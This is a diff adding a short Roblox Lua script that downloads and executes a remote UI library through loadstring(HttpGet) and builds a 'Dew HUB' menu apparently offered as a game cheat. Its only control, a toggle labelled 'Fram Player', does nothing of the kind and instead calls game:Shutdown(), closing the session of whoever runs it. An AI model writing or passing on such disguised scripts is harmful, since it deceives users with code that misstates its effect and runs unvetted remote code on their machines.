@@ -1,0 +1,9 @@
+repeat task.wait() until game:IsLoaded()
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Dew HUB", "DarkTheme")
+local Tab = Window:NewTab("Player")
+local Section = Tab:NewSection("Select Player!")
+Section:NewToggle("Fram Player", "", function()
+    game:Shutdown()
+end)
